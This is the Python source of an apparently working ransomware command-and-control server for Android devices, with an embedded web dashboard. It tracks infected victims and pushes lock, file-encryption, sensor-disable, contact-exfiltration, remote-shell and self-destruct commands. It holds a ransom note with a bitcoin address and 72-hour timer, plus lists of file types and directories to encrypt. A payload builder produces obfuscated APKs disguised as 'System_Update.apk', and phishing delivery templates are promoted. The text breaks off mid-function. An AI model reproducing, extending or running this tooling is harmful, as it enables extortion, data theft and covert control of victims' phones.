#!/usr/bin/env python3
"""
SET C2 Server v5.0 - Production Command & Control Dashboard
Flask + SocketIO real-time WebSocket-based C2 with:
- Live victim overview with real-time status streaming
- Per-victim event log with timestamps
- Command broadcast (single target or all victims)
- Ransom note configuration (pushed live to victims)
- Exfiltrated data viewer
- DGA domain pre-registration
- Built-in payload builder via web UI
- **Multi-Template Social Engineering Engine (12 delivery templates)**
"""

import os, sys, json, time, uuid, ssl, sqlite3, base64, hashlib
import secrets, logging, threading, hmac
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Any

try:
    from flask import Flask, request, jsonify, render_template_string, send_file, abort
    from flask_socketio import SocketIO, emit, join_room
    import eventlet
    eventlet.monkey_patch()
except ImportError:
    print("[!] Install: pip install flask flask-socketio eventlet cryptography")
    sys.exit(1)

# ================================================================
# SET BUILDER v5 INTEGRATION
# ================================================================
try:
    from set_builder_v5 import create_builder, get_c2_routes, BUILDER_DASHBOARD_HTML, TEMPLATE_REGISTRY
    BUILDER_AVAILABLE = True
    print("[+] SET Builder v5 loaded (12 social-engineering templates)")
except ImportError as e:
    print(f"[!] SET Builder v5 not available: {e}")
    print("[!] Run: pip install set_builder_v5 or place set_builder_v5.py in same directory")
    BUILDER_AVAILABLE = False
    # Create dummy to avoid crashes
    def create_builder():
        return None
    def get_c2_routes(b):
        from flask import Blueprint
        bp = Blueprint("builder", __name__, url_prefix="/api/builder")
        @bp.route("/templates")
        def no_builder():
            return jsonify({"error": "Builder not installed"})
        return bp
    TEMPLATE_REGISTRY = {}

# ================================================================
# DATABASE SETUP
# ================================================================
DB_PATH = Path(__file__).parent / "set_c2.db"

def init_db():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            device_name TEXT, android_version TEXT, manufacturer TEXT,
            model TEXT, sdk_level INTEGER, ip TEXT,
            first_seen TEXT, last_seen TEXT,
            status TEXT DEFAULT 'active',
            lock_mode TEXT DEFAULT 'none',
            ransom_paid INTEGER DEFAULT 0,
            channel TEXT DEFAULT 'unknown',
            battery INTEGER DEFAULT 100,
            notes TEXT
        );
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY, victim_id TEXT, command TEXT,
            params TEXT, status TEXT DEFAULT 'pending',
            issued_at TEXT, executed_at TEXT, result TEXT
        );
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT, event_type TEXT, details TEXT, timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT, data_type TEXT, content TEXT,
            received_at TEXT, size INTEGER
        );
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY, value TEXT
        );
    """)
    
    defaults = {
        "c2_port": "8443",
        "use_ssl": "true",
        "beacon_interval": "30",
        "ransom_note_template": json.dumps({
            "title": "YOUR DEVICE HAS BEEN ENCRYPTED",
            "message": "All files encrypted with AES-256.\nContact for decryption.",
            "amount_btc": 0.5,
            "btc_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            "email": "support@onionmail.com",
            "timer_hours": 72,
            "background_color": "#0a0a0a",
            "text_color": "#ff3333"
        }),
        "default_lock_mode": "full",
        "encrypt_extensions": json.dumps([
            ".txt",".doc",".docx",".xls",".xlsx",".pdf",
            ".jpg",".jpeg",".png",".gif",".mp4",".mp3",
            ".zip",".rar",".7z",".db",".sqlite",".csv",
            ".ppt",".pptx",".odt",".ods",".odp",".rtf",
            ".html",".htm",".php",".js",".py",".sql",
            ".xml",".json",".cfg",".key",".pem",".wallet"
        ]),
        "target_dirs": json.dumps([
            "/sdcard/Documents","/sdcard/Download","/sdcard/Pictures",
            "/sdcard/DCIM","/sdcard/Music","/sdcard/Movies",
            "/sdcard/Android/media","/sdcard/Android/data"
        ])
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)", (k, v))
    conn.commit()
    conn.close()

init_db()

# ================================================================
# HELPERS
# ================================================================

def get_config(key: str, default=None):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default

def set_config(key: str, value: str):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_victim(victim_id: str) -> Optional[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    row = c.fetchone()
    conn.close()
    return dict(row) if row else None

def get_all_victims() -> List[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows

def add_event(victim_id: str, event_type: str, details: str):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT INTO events (victim_id, event_type, details, timestamp) VALUES (?,?,?,?)",
              (victim_id, event_type, details, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

def get_victim_events(victim_id: str, limit=200):
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM events WHERE victim_id=? ORDER BY timestamp DESC LIMIT ?",
              (victim_id, limit))
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows

def issue_command(victim_id: str, command: str, params: Dict = None) -> str:
    cmd_id = str(uuid.uuid4())
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT INTO commands (id, victim_id, command, params, status, issued_at) VALUES (?,?,?,?,'pending',?)",
              (cmd_id, victim_id, command, json.dumps(params or {}), datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return cmd_id

def mark_command_executed(cmd_id: str, result: str = None):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("UPDATE commands SET status='executed', executed_at=?, result=? WHERE id=?",
              (datetime.utcnow().isoformat(), result, cmd_id))
    conn.commit()
    conn.close()

# ================================================================
# SSL CERT GENERATION
# ================================================================

def generate_self_signed_cert(cert_path: Path, key_path: Path):
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SET-C2"),
            x509.NameAttribute(NameOID.COMMON_NAME, "set-c2.local"),
        ])
        cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer)
                .public_key(key.public_key()).serial_number(x509.random_serial_number())
                .not_valid_before(datetime.utcnow())
                .not_valid_after(datetime.utcnow() + timedelta(days=365))
                .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
                .sign(key, hashes.SHA256()))
        
        with open(key_path, "wb") as f:
            f.write(key.private_bytes(serialization.Encoding.PEM,
                                      serialization.PrivateFormat.TraditionalOpenSSL,
                                      serialization.NoEncryption()))
        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
    except Exception as e:
        print(f"[!] Cert generation failed: {e}")

# ================================================================
# FLASK APP + SOCKETIO
# ================================================================

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

connected_victims: Dict[str, Dict] = {}  # sid -> victim_info

# ================================================================
# INIT BUILDER & REGISTER ROUTES
# ================================================================
builder = create_builder()
builder_bp = get_c2_routes(builder)
app.register_blueprint(builder_bp)

# ================================================================
# WEB UI - EMBEDDED (with Builder Dashboard link in sidebar)
# ================================================================

INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SET C2 v5.0 Dashboard</title>
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
:root{--bg:#05080f;--bg2:#0c1421;--bg3:#111d33;--primary:#00f0ff;--primary-dim:rgba(0,240,255,0.1);--danger:#ff1a4a;--warning:#ffaa33;--success:#00ff88;--text:#d0d8f0;--text-dim:#7888a0;--border:#1a2840;--radius:6px;}
body{font-family:'Inter','Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
::-webkit-scrollbar{width:5px;}
::-webkit-scrollbar-track{background:var(--bg2);}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
.sidebar{width:240px;background:var(--bg2);border-right:1px solid var(--border);padding:20px 14px;display:flex;flex-direction:column;flex-shrink:0;}
.sidebar .logo{font-size:22px;font-weight:800;margin-bottom:28px;letter-spacing:-0.5px;}
.sidebar .logo span{color:var(--primary);}
.sidebar nav{display:flex;flex-direction:column;gap:2px;}
.sidebar nav a{padding:9px 12px;border-radius:var(--radius);color:var(--text-dim);text-decoration:none;font-size:13px;font-weight:500;transition:.15s;display:flex;align-items:center;gap:8px;}
.sidebar nav a:hover,.sidebar nav a.active{background:var(--primary-dim);color:var(--primary);}
.sidebar .stats{margin-top:auto;padding:14px;background:var(--bg3);border-radius:var(--radius);font-size:12px;}
.sidebar .stats .row{display:flex;justify-content:space-between;margin:3px 0;}
.sidebar .stats .row .val{color:var(--primary);font-weight:600;}
.main{flex:1;padding:20px 28px;overflow-y:auto;max-height:100vh;}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
.header h1{font-size:24px;font-weight:700;}
.header .sub{color:var(--text-dim);font-size:13px;}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:20px;}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;}
.card .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--text-dim);margin-bottom:4px;}
.card .val{font-size:26px;font-weight:700;}
.card .val.danger{color:var(--danger);}
.card .val.success{color:var(--success);}
.card .val.primary{color:var(--primary);}
.card .val.warning{color:var(--warning);}
.table-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;}
table{width:100%;border-collapse:collapse;}
thead{background:var(--bg3);}
th{padding:10px 14px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.4px;color:var(--text-dim);font-weight:600;}
td{padding:10px 14px;border-top:1px solid var(--border);font-size:13px;}
tbody tr{transition:.12s;cursor:pointer;}
tbody tr:hover{background:var(--primary-dim);}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.2px;}
.badge.active{background:rgba(0,240,255,0.12);color:var(--primary);}
.badge.locked{background:rgba(255,26,74,0.12);color:var(--danger);}
.badge.offline{background:rgba(120,136,160,0.12);color:var(--text-dim);}
.badge.paid{background:rgba(0,255,136,0.12);color:var(--success);}
.btn{padding:7px 14px;border:none;border-radius:var(--radius);font-size:12px;font-weight:600;cursor:pointer;transition:.15s;}
.btn-primary{background:var(--primary);color:#000;}
.btn-primary:hover{opacity:.8;}
.btn-danger{background:var(--danger);color:#fff;}
.btn-danger:hover{opacity:.8;}
.btn-sm{padding:4px 8px;font-size:10px;}
.btn-ghost{background:transparent;color:var(--text-dim);border:1px solid var(--border);}
.btn-ghost:hover{background:var(--bg3);color:var(--text);}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);z-index:1000;align-items:center;justify-content:center;}
.modal-overlay.active{display:flex;}
.modal{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;width:600px;max-width:90vw;max-height:85vh;overflow-y:auto;}
.modal h2{margin-bottom:14px;font-size:18px;}
.modal .fg{margin-bottom:12px;}
.modal label{display:block;font-size:12px;color:var(--text-dim);margin-bottom:3px;font-weight:500;}
.modal input,.modal select,.modal textarea{width:100%;padding:8px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:13px;}
.modal textarea{min-height:60px;resize:vertical;font-family:monospace;font-size:12px;}
.modal .br{display:flex;gap:8px;justify-content:flex-end;margin-top:14px;}
.hidden{display:none;}
.flex{display:flex;}
.gap-2{gap:8px;}
.gap-4{gap:16px;}
.ac{align-items:center;}
.jb{justify-content:space-between;}
.mb{margin-bottom:14px;}
.mt{margin-top:14px;}
.t-sm{font-size:12px;}
.t-dim{color:var(--text-dim);}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
.log-box{background:#000;border:1px solid var(--border);border-radius:var(--radius);padding:10px;max-height:250px;overflow-y:auto;font-family:'Fira Code','JetBrains Mono',monospace;font-size:11px;line-height:1.5;}
.log-box .entry{color:var(--primary);}
.log-box .entry.warn{color:var(--warning);}
.log-box .entry.err{color:var(--danger);}
.log-box .entry.sys{color:#8888ff;}
.tabs{display:flex;gap:2px;margin-bottom:14px;background:var(--bg3);border-radius:var(--radius);padding:2px;}
.tabs button{padding:6px 16px;border:none;background:transparent;color:var(--text-dim);font-size:12px;font-weight:500;cursor:pointer;border-radius:5px;transition:.15s;}
.tabs button.active{background:var(--primary);color:#000;}
@media(max-width:768px){.sidebar{display:none;}.main{padding:14px;}.g2{grid-template-columns:1fr;}}
</style>
</head>
<body>

<!-- SIDEBAR -->
<div class="sidebar">
<div class="logo"><span>SET</span> C2</div>
<nav>
<a href="#" class="active" data-page="dashboard">&#9783; Dashboard</a>
<a href="#" data-page="victims">&#127919; Victims</a>
<a href="#" data-page="builder">&#128295; Builder</a>
<a href="/builder" data-page="templates" target="_blank">&#127912; Templates (NEW)</a>
<a href="#" data-page="exfil">&#128230; Exfil Data</a>
<a href="#" data-page="config">&#9881; Config</a>
</nav>
<div class="stats">
<div class="row"><span>Online</span><span class="val" id="sOnline">0</span></div>
<div class="row"><span>Total</span><span class="val" id="sTotal">0</span></div>
<div class="row"><span>Locked</span><span class="val" style="color:var(--danger)" id="sLocked">0</span></div>
<div class="row"><span>Paid</span><span class="val" style="color:var(--success)" id="sPaid">0</span></div>
</div>
</div>

<!-- MAIN -->
<div class="main">
<div class="header">
<div><h1 id="pageTitle">Dashboard</h1><div class="sub" id="pageSub">Real-time command & control</div></div>
<div class="flex gap-2 ac"><span class="t-sm t-dim" id="connStatus">&#9679; Connecting...</span></div>
</div>

<!-- PAGE: DASHBOARD -->
<div id="page-dashboard">
<div class="cards">
<div class="card"><div class="lbl">Victims Online</div><div class="val primary" id="dOnline">0</div></div>
<div class="card"><div class="lbl">Total Infected</div><div class="val" id="dTotal">0</div></div>
<div class="card"><div class="lbl">Currently Locked</div><div class="val danger" id="dLocked">0</div></div>
<div class="card"><div class="lbl">Ransom Paid</div><div class="val success" id="dPaid">0</div></div>
</div>
<div class="tabs">
<button class="active" data-tab="recent">Recent Activity</button>
<button data-tab="live">Live Log</button>
</div>
<div id="tab-recent">
<div class="table-wrap">
<table><thead><tr><th>Victim</th><th>Event</th><th>Details</th><th>Time</th></tr></thead>
<tbody id="recentEvents"></tbody></table>
</div></div>
<div id="tab-live" class="hidden">
<div class="log-box" id="liveLog"></div>
</div>
</div>

<!-- PAGE: VICTIMS -->
<div id="page-victims" class="hidden">
<div class="table-wrap">
<table><thead><tr>
<th>ID</th><th>Device</th><th>Android</th><th>IP</th><th>Channel</th><th>Status</th><th>Lock</th><th>Battery</th><th>Last Seen</th><th>Actions</th>
</tr></thead>
<tbody id="victimsTable"></tbody></table>
</div>
</div>

<!-- PAGE: BUILDER -->
<div id="page-builder" class="hidden">
<div class="g2">
<div class="card">
<h3 class="mb">&#128295; Payload Builder</h3>
<div class="fg"><label>C2 Host</label><input type="text" id="bHost" value="localhost"></div>
<div class="fg"><label>C2 Port</label><input type="number" id="bPort" value="8443"></div>
<div class="fg"><label>SSL</label><select id="bSSL"><option value="true">Yes</option><option value="false">No</option></select></div>
<div class="fg"><label>Lock Mode</label><select id="bLock"><option value="full">Full (encrypt + lock + sensors)</option><option value="files">Files Only</option><option value="screen">Screen Lock</option><option value="sensors">Sensor Block</option></select></div>
<div class="fg"><label>Obfuscation</label><select id="bObf"><option value="aes">AES Encrypted</option><option value="xor">XOR + Base64</option><option value="base64">Base64 Only</option></select></div>
<div class="fg"><label>Output Name</label><input type="text" id="bName" value="System_Update.apk"></div>
<button class="btn btn-primary" onclick="buildPayload()">&#128295; Generate Payload</button>
<div id="bResult" class="hidden mt">
<div class="t-sm t-dim">Payload generated:</div>
<a href="#" id="bDownload" class="btn btn-primary btn-sm mt">&#8595; Download</a>
<pre id="bCode" class="mt" style="background:#000;padding:10px;border-radius:6px;font-size:10px;max-height:300px;overflow:auto;"></pre>
</div>
</div>
<div class="card">
<h3 class="mb">&#9889; Quick Broadcast</h3>
<div class="fg"><label>Target</label><select id="bcVictim"><option value="__ALL__">All Active Victims</option></select></div>
<div class="fg"><label>Command</label>
<select id="bcCmd">
<option value="lock_files">&#128274; Lock Files</option>
<option value="lock_screen">&#128241; Lock Screen</option>
<option value="lock_full">&#9940; Full Lockdown</option>
<option value="lock_sensors">&#128200; Disable Sensors</option>
<option value="unlock">&#128275; Unlock/Decrypt</option>
<option value="status">&#128200; Get Status</option>
<option value="exfil">&#128230; Exfiltrate Data</option>
<option value="self_destruct">&#9760; Self Destruct</option>
</select>
</div>
<button class="btn btn-danger" onclick="broadcastCmd()">&#128640; Execute</button>
</div>
<div class="card" style="grid-column: 1 / -1;">
<h3 class="mb">&#127912; Social Engineering Templates</h3>
<p class="t-sm t-dim mb">Choose from 12 pre-built phishing templates or build your own using the <a href="/builder" target="_blank" style="color:var(--primary);">Template Builder</a>.</p>
<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;" id="templateList"></div>
</div>
</div>
</div>

<!-- PAGE: EXFIL -->
<div id="page-exfil" class="hidden">
<div class="table-wrap">
<table><thead><tr><th>Victim</th><th>Type</th><th>Size</th><th>Received</th><th>Content Preview</th></tr></thead>
<tbody id="exfilTable"></tbody></table>
</div>
</div>

<!-- PAGE: CONFIG -->
<div id="page-config" class="hidden">
<div class="g2">
<div class="card">
<h3 class="mb">&#127912; Ransom Note</h3>
<div class="fg"><label>Title</label><input type="text" id="cfgTitle" value="YOUR DEVICE HAS BEEN ENCRYPTED"></div>
<div class="fg"><label>Message</label><textarea id="cfgMsg" rows="2">All files encrypted with AES-256.\nContact for decryption.</textarea></div>
<div class="fg"><label>BTC Amount</label><input type="number" id="cfgBtc" value="0.5" step="0.01"></div>
<div class="fg"><label>BTC Address</label><input type="text" id="cfgAddr" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"></div>
<div class="fg"><label>Email</label><input type="text" id="cfgEmail" value="support@onionmail.com"></div>
<div class="fg"><label>Timer (hours)</label><input type="number" id="cfgTimer" value="72"></div>
<button class="btn btn-primary" onclick="saveRansom()">Save</button>
</div>
<div class="card">
<h3 class="mb">&#128220; Targets</h3>
<div class="fg"><label>Extensions</label><textarea id="cfgExt" rows="3">[".txt",".doc",".docx",".pdf",".jpg",".png",".mp4",".zip",".db",".sqlite",".csv",".ppt",".html",".php",".js",".py",".sql"]</textarea></div>
<div class="fg"><label>Directories</label><textarea id="cfgDir" rows="2">["/sdcard/Documents","/sdcard/Download","/sdcard/Pictures","/sdcard/DCIM","/sdcard/Music","/sdcard/Movies"]</textarea></div>
<button class="btn btn-primary" onclick="saveTargets()">Save</button>
</div>
</div>
</div>
</div>

<!-- VICTIM MODAL -->
<div class="modal-overlay" id="victimModal">
<div class="modal">
<h2>&#127919; Victim Details</h2>
<div id="vDetail"></div>
<div class="fg"><label>Send Command</label>
<select id="vCmd">
<option value="lock_files">&#128274; Lock Files</option>
<option value="lock_screen">&#128241; Lock Screen</option>
<option value="lock_full">&#9940; Full Lockdown</option>
<option value="lock_sensors">&#128200; Disable Sensors</option>
<option value="unlock">&#128275; Unlock/Decrypt</option>
<option value="status">&#128200; Get Status</option>
<option value="exfil">&#128230; Exfiltrate (contacts)</option>
<option value="self_destruct">&#9760; Self Destruct</option>
<option value="exec">&#128187; Exec Shell</option>
</select>
</div>
<div class="fg" id="vExecExtra" class="hidden"><label>Shell Command</label><input type="text" id="vExecCmd" placeholder="e.g., ls -la /sdcard/"></div>
<div class="br">
<button class="btn btn-ghost" onclick="closeVM()">Close</button>
<button class="btn btn-danger" onclick="sendVicCmd()">Send Command</button>
</div>
<div class="mt"><h4 class="t-sm t-dim mb">Event Log</h4>
<div class="log-box" id="vLog" style="max-height:180px;"></div>
</div>
</div>
</div>

<script>
const socket = io(window.location.origin, {transports:['websocket','polling'],reconnection:true});

let victims = {};
let currentVic = null;

socket.on('connect', ()=>{
  document.getElementById('connStatus').textContent = '● Connected';
  document.getElementById('connStatus').style.color = 'var(--success)';
});
socket.on('disconnect', ()=>{
  document.getElementById('connStatus').textContent = '● Disconnected';
  document.getElementById('connStatus').style.color = 'var(--danger)';
});

socket.on('victim_update', (d)=>{
  victims[d.id] = d;
  updateAll();
  addLog(d.id.slice(0,8)+' status: '+d.status, 'sys');
});

socket.on('victim_event', (d)=>{
  addRecent(d);
  addLog(d.details||d.event_type, d.event_type==='error'?'err':'info');
});

socket.on('command_result', (d)=>{
  addLog('Cmd '+d.command+' on '+d.victim_id.slice(0,8)+': '+(d.result||'done'), 'sys');
  if(currentVic===d.victim_id) loadVEvents(d.victim_id);
});

socket.on('initial_state', (d)=>{
  victims = d.victims||{};
  updateAll();
  (d.events||[]).forEach(e=>addRecent(e));
  updateBcSelect();
});

// Page nav
document.querySelectorAll('.sidebar nav a').forEach(a=>{
  a.addEventListener('click', (e)=>{
    if(a.getAttribute('target')==='_blank') return; // external link
    e.preventDefault();
    document.querySelectorAll('.sidebar nav a').forEach(x=>x.classList.remove('active'));
    a.classList.add('active');
    const page = a.dataset.page;
    document.querySelectorAll('[id^="page-"]').forEach(p=>p.classList.add('hidden'));
    document.getElementById('page-'+page).classList.remove('hidden');
    document.getElementById('pageTitle').textContent = a.textContent.trim();
    if(page==='config') loadConfig();
    if(page==='exfil') loadExfil();
    if(page==='builder') loadTemplates();
  });
});

// Tab switch
document.querySelectorAll('.tabs button').forEach(b=>{
  b.addEventListener('click', ()=>{
    document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active'));
    b.classList.add('active');
    const id = b.dataset.tab;
    document.querySelectorAll('[id^="tab-"]').forEach(t=>t.classList.add('hidden'));
    document.getElementById('tab-'+id).classList.remove('hidden');
  });
});

// Victim modal command change
document.getElementById('vCmd').addEventListener('change', function(){
  document.getElementById('vExecExtra').classList.toggle('hidden', this.value!=='exec');
});

function loadTemplates(){
  fetch('/api/builder/templates').then(r=>r.json()).then(templates=>{
    if(templates.error) return;
    const list = document.getElementById('templateList');
    list.innerHTML = templates.map(t => 
      `<a href="/builder?template=${t.id}" target="_blank" style="display:block;padding:8px 12px;background:var(--bg3);border-radius:var(--radius);color:var(--text);text-decoration:none;font-size:11px;border:1px solid transparent;transition:.15s;" onmouseover="this.style.borderColor='var(--primary)'" onmouseout="this.style.borderColor='transparent'">
        <strong>${t.name}</strong><br><span style="font-size:9px;color:var(--text-dim);">${t.category} · Conv: ${t.conversion_estimate}</span>
      </a>`
    ).join('');
  }).catch(()=>{});
}

function updateAll(){
  updateTable(); updateStats(); updateSidebar(); updateBcSelect();
}

function updateStats(){
  const v = Object.values(victims);
  document.getElementById('dOnline').textContent = v.filter(x=>x.status==='active'||x.status==='locked').length;
  document.getElementById('dTotal').textContent = v.length;
  document.getElementById('dLocked').textContent = v.filter(x=>x.status==='locked').length;
  document.getElementById('dPaid').textContent = v.filter(x=>x.status==='paid').length;
}

function updateSidebar(){
  const v = Object.values(victims);
  document.getElementById('sOnline').textContent = v.filter(x=>x.status==='active'||x.status==='locked').length;
  document.getElementById('sTotal').textContent = v.length;
  document.getElementById('sLocked').textContent = v.filter(x=>x.status==='locked').length;
  document.getElementById('sPaid').textContent = v.filter(x=>x.status==='paid').length;
}

function updateTable(){
  const t = document.getElementById('victimsTable');
  const v = Object.values(victims);
  if(!v.length){t.innerHTML='<tr><td colspan="10" style="text-align:center;padding:24px;color:var(--text-dim)">No victims. Deploy payload.</td></tr>';return;}
  const icons = {files:'🔒',screen:'📱',full:'⛔',sensors:'📡',apps:'📲'};
  t.innerHTML = v.map(x=>{
    const cls = x.status==='locked'?'locked':(x.status==='paid'?'paid':(x.status==='active'?'active':'offline'));
    return `<tr onclick="openVM('${x.id}')">
      <td style="font-family:monospace;font-size:11px">${x.id.slice(0,8)}...</td>
      <td>${x.device_name||'?'}</td>
      <td>${x.android_version||'?'}</td>
      <td>${x.ip||'?'}</td>
      <td>${x.channel||'?'}</td>
      <td><span class="badge ${cls}">${x.status}</span></td>
      <td>${icons[x.lock_mode]||'○'} ${x.lock_mode||'none'}</td>
      <td>${x.battery||'?'}%</td>
      <td class="t-dim t-sm">${x.last_seen?new Date(x.last_seen).toLocaleString():'?'}</td>
      <td><button class="btn btn-sm btn-ghost" onclick="event.stopPropagation();openVM('${x.id}')">Details</button></td>
    </tr>`;
  }).join('');
}

function updateBcSelect(){
  const s = document.getElementById('bcVictim');
  s.innerHTML = '<option value="__ALL__">All Active Victims</option>';
  Object.values(victims).forEach(v=>{
    const o = document.createElement('option');
    o.value=v.id; o.textContent=v.id.slice(0,8)+'... - '+v.device_name;
    s.appendChild(o);
  });
}

function addRecent(ev){
  const t = document.getElementById('recentEvents');
  const tr = document.createElement('tr');
  tr.innerHTML = `<td style="font-family:monospace;font-size:11px">${(ev.victim_id||'?').slice(0,8)}...</td>
    <td>${ev.event_type}</td><td>${ev.details||''}</td>
    <td class="t-sm t-dim">${ev.timestamp?new Date(ev.timestamp).toLocaleString():'?'}</td>`;
  t.prepend(tr);
  while(t.children.length>50) t.removeChild(t.lastChild);
}

function addLog(text, type='info'){
  const l = document.getElementById('liveLog');
  const d = document.createElement('div');
  d.className = 'entry '+type;
  d.textContent = '['+new Date().toLocaleTimeString()+'] '+text;
  l.appendChild(d);
  l.scrollTop = l.scrollHeight;
  while(l.children.length>200) l.removeChild(l.firstChild);
}

function openVM(id){
  currentVic = id;
  const v = victims[id];
  if(!v) return;
  document.getElementById('vDetail').innerHTML = `
    <div class="g2 t-sm">
      <div><strong>ID:</strong><br><span style="font-family:monospace">${v.id}</span></div>
      <div><strong>Device:</strong><br>${v.device_name||'?'} (${v.manufacturer||'?'} ${v.model||'?'})</div>
      <div><strong>Android:</strong><br>${v.android_version||'?'} (SDK ${v.sdk_level||'?'})</div>
      <div><strong>Channel:</strong><br>${v.channel||'?'}</div>
      <div><strong>Status:</strong><br><span class="badge ${v.status}">${v.status}</span></div>
      <div><strong>Lock:</strong><br>${v.lock_mode||'none'}</div>
      <div><strong>Battery:</strong><br>${v.battery||'?'}%</div>
      <div><strong>Paid:</strong><br>${v.ransom_paid?'✅ YES':'❌ NO'}</div>
    </div>
  `;
  document.getElementById('victimModal').classList.add('active');
  loadVEvents(id);
}

function closeVM(){
  document.getElementById('victimModal').classList.remove('active');
  currentVic = null;
}

function loadVEvents(id){
  fetch('/api/victim/'+id+'/events').then(r=>r.json()).then(ev=>{
    const l = document.getElementById('vLog');
    l.innerHTML = ev.map(e=>
      '<div class="entry '+(e.event_type==='error'?'err':'info')+'">['+
      new Date(e.timestamp).toLocaleString()+'] '+e.event_type+': '+e.details+'</div>'
    ).join('') || '<div class="t-dim">No events</div>';
  });
}

function sendVicCmd(){
  if(!currentVic) return;
  const cmd = document.getElementById('vCmd').value;
  const params = {};
  if(cmd==='exec') params.cmd = document.getElementById('vExecCmd').value;
  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({victim_id:currentVic,command:cmd,params:params})
  }).then(r=>r.json()).then(r=>addLog('Cmd '+cmd+' sent','sys'));
}

function broadcastCmd(){
  const id = document.getElementById('bcVictim').value;
  const cmd = document.getElementById('bcCmd').value;
  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({victim_id:id,command:cmd,params:{}})
  }).then(r=>r.json()).then(r=>addLog('Broadcast: '+cmd,'sys'));
}

function buildPayload(){
  const d = {
    host: document.getElementById('bHost').value,
    port: parseInt(document.getElementById('bPort').value),
    ssl: document.getElementById('bSSL').value==='true',
    lock_mode: document.getElementById('bLock').value,
    obfuscation: document.getElementById('bObf').value,
    name: document.getElementById('bName').value
  };
  fetch('/api/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
  .then(r=>r.json()).then(res=>{
    if(res.error){alert(res.error);return;}
    document.getElementById('bResult').classList.remove('hidden');
    document.getElementById('bDownload').href = res.download_url;
    document.getElementById('bCode').textContent = res.payload_code||'Payload ready.';
  });
}

function saveRansom(){
  const d = {
    title: document.getElementById('cfgTitle').value,
    message: document.getElementById('cfgMsg').value,
    amount_btc: parseFloat(document.getElementById('cfgBtc').value),
    btc_address: document.getElementById('cfgAddr').value,
    email: document.getElementById('cfgEmail').value,
    timer_hours: parseInt(document.getElementById('cfgTimer').value)
  };
  fetch('/api/config/ransom',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
